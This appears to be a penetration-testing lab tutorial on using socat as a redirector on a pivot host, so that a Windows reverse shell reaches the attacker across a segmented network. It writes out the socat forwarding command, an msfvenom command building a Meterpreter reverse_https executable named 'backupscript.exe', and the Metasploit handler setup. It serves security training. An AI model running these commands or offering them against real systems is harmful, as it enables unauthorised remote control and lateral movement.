## Overview

**Socat** is a flexible bidirectional relay tool that can connect two independent data channels together.

In pivoting terms, think of it like a **traffic forwarder**:

- it listens on one port
- accepts incoming connections
- forwards them somewhere else
- and relays traffic in both directions

Unlike SSH tunnelling, **socat does not require an SSH session**. It is simply acting as a redirector.

This makes it useful when:

- SSH is unavailable
- you want a lightweight relay
- you already control an intermediate host
- you need an internal target to callback through a pivot

---

# Why Use Socat Here?

## Problem

The internal Windows host cannot connect directly back to your attack host.

For example:

- attack host: `10.10.14.18`
- Ubuntu pivot host: `172.16.5.129`
- Windows target: internal-only system

The Windows host may only be able to reach the Ubuntu pivot host, not your attack box.

## Solution

Use **socat on the Ubuntu pivot** to:

- listen for the Windows reverse shell callback
- receive the connection on the pivot
- forward it on to your Metasploit handler on the attack host

So the flow becomes:

1. Windows payload calls back to the Ubuntu pivot
2. socat receives the callback
3. socat forwards the traffic to your attack host
4. Metasploit catches the session

---

# Socat Listener / Redirector

## Command

```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

## What This Does

- `TCP4-LISTEN:8080`  
  Listen on TCP port `8080` on the Ubuntu pivot host

- `fork`  
  Handle multiple connections by forking a new process for each one

- `TCP4:10.10.14.18:80`  
  Forward all received traffic to the attack host on port `80`

## In Plain English

This tells socat:

> “Listen on port 8080 here on the pivot host, and whenever anything connects, send that traffic to 10.10.14.18 port 80.”

# Start the Socat Redirector on the Pivot

```bash

```

## Example

```text
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

At this point, the pivot host is waiting for a connection on `8080`.

# Create the Windows Payload

Now generate a payload that connects **to the pivot host**, not to your attack host directly.

## Command

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupscript.exe
```

## Example Output

```text

[-] No arch selected, selecting arch: x64 from the payload
```

## Why `LHOST=172.16.5.129`?

Because the Windows host can reach the Ubuntu pivot host.

It likely **cannot** reach your attack host directly, so the payload must target the pivot.

# Start Metasploit Handler on the Attack Host

Since socat will forward traffic to your attack host on port `80`, you need a handler listening there.

## Start Metasploit

```bash
sudo msfconsole
```

## Configure the Handler

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run
```

## Example Session

```text
msf6 > use exploit/multi/handler
```

# Traffic Flow Explained

At this point, the setup looks like this:

## On the Pivot Host

- socat listens on `172.16.5.129:8080`

## On the Attack Host

- Metasploit listens on `10.10.14.18:80`

## On the Windows Target

- payload connects to `172.16.5.129:8080`

## Result

The callback path is:

```text
Windows target --> Ubuntu pivot:8080 --> socat --> Attack host:80 --> Metasploit handler
```

Socat is acting like a **middleman cable**, relaying the payload’s traffic back to your listener.


This indicates the traffic appears to be coming from the **pivot host**, not directly from the Windows machine.

# Why `fork` Matters in Socat

The `fork` option is important.

Without it, socat would generally handle only a single connection and then stop or block.

With `fork`:

- every incoming connection gets its own child process
- the listener remains available
- multiple or repeated callbacks are easier to handle

This is especially useful with reverse shells and staged payloads.

# Why Use Socat Instead of SSH Forwarding?

## Socat Advantages

- does not require SSH access
- lightweight and flexible
- easy to chain with listeners and services
- useful on hosts where SSH forwarding is unavailable
- great for simple port redirection

## Tradeoff

Unlike SSH tunnels:

- it does not provide encryption by itself
- it is just a relay
- you need the traffic itself to be encrypted if that matters

In this example, the payload is `reverse_https`, so the traffic is encrypted by the payload protocol, not by socat.

Socat is not the shell itself.

Socat is useful for more than Meterpreter.

- forwarding Netcat shells
- relaying HTTP services
- exposing internal services externally
- bouncing reverse shells through pivots
- quick ad hoc TCP tunnelling
- chaining multiple internal hops

# Common Pitfalls

## Wrong Listener Port

Your Metasploit handler must match the socat forward destination.

In this case:

- socat forwards to `10.10.14.18:80`
- handler must listen on `80`

## Wrong Payload LHOST

The payload must point to the **pivot host**:

- `172.16.5.129`

Not the attack host.

## Firewall Restrictions

Make sure:

- the Windows target can reach the pivot on `8080`
- the pivot can reach your attack host on `80`

## Port Already in Use

If `8080` or `80` is already occupied, choose different ports consistently across:

- socat listener
- payload callback
- Metasploit handler

# Key Takeaways

- **Socat** is a bidirectional TCP relay.
- It can forward reverse shells through a pivot host **without SSH**.
- The payload must connect to the **pivot**, not directly to your attack host.
- Socat forwards the callback to your real listener.
- This is a simple and effective method for **pivoting reverse shells** across segmented networks.
